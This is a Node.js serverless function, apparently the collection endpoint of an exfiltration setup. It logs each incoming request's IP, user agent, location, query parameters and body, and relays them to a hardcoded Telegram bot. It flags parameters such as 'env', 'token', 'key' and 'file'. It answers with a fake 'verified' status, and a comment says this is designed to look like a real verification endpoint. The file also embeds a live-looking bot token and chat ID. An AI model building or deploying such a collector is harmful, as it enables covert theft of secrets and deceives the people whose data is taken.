// hit.js — intake endpoint
// Logs every hit to Telegram + returns a clean JSON response

const https = require('https');

const BOT_TOKEN = '8721415431:AAGY_Bvwd2sxuf6Jb9KzxpE0sW2KJ99P8MU';
const CHAT_ID   = '6087310705';

exports.handler = async (event) => {
    const headers = event.headers || {};
    const query = event.queryStringParameters || {};
    const body = event.body || '';

    // Build a compact hit record
    const hit = {
        ts: new Date().toISOString(),
        ip: headers['x-nf-client-connection-ip'] || headers['x-forwarded-for'] || 'unknown',
        ua: headers['user-agent'] || 'unknown',
        method: event.httpMethod,
        path: event.path,
        query: query,
        body: body.slice(0, 2000),
        country: headers['x-country'] || headers['x-nf-geo'] || 'unknown',
    };

    // Compose Telegram message
    const lines = [
        '🎯 <b>NEXUS HIT</b>',
        '',
        '<b>Time:</b> ' + hit.ts,
        '<b>IP:</b> <code>' + hit.ip + '</code>',
        '<b>Country:</b> ' + hit.country,
        '<b>Method:</b> ' + hit.method,
        '<b>Path:</b> ' + hit.path,
        '<b>UA:</b> <code>' + hit.ua.slice(0, 120) + '</code>',
    ];

    // Include any query params that look interesting
    const interestingKeys = ['env', 'data', 'v', 'check', 'verify', 'token', 'key', 'file'];
    for (const k of Object.keys(query)) {
        if (interestingKeys.includes(k.toLowerCase()) || query[k].length < 500) {
            lines.push('<b>q[' + k + ']:</b> <code>' + String(query[k]).slice(0, 300) + '</code>');
        }
    }

    if (body) {
        lines.push('');
        lines.push('<b>Body:</b>');
        lines.push('<pre>' + body.slice(0, 1000).replace(/</g, '&lt;') + '</pre>');
    }

    const message = lines.join('\n');

    // Fire to Telegram (don't await — return fast)
    try {
        await sendTelegram(message);
    } catch (e) {
        console.error('telegram failed', e);
    }

    // Return a response that looks like a real verification endpoint
    return {
        statusCode: 200,
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'Cache-Control': 'no-store',
        },
        body: JSON.stringify({
            status: 'verified',
            version: '2.4.1',
            uptime_ms: 892341,
            node: 'mainnet',
            checked_at: new Date().toISOString(),
        }),
    };
};

function sendTelegram(text) {
    return new Promise((resolve, reject) => {
        const payload = JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: true,
        });

        const req = https.request({
            hostname: 'api.telegram.org',
            path: '/bot' + BOT_TOKEN + '/sendMessage',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload),
            },
        }, (res) => {
            let body = '';
            res.on('data', c => body += c);
            res.on('end', () => resolve(body));
        });

        req.on('error', reject);
        req.write(payload);
        req.end();
    });
}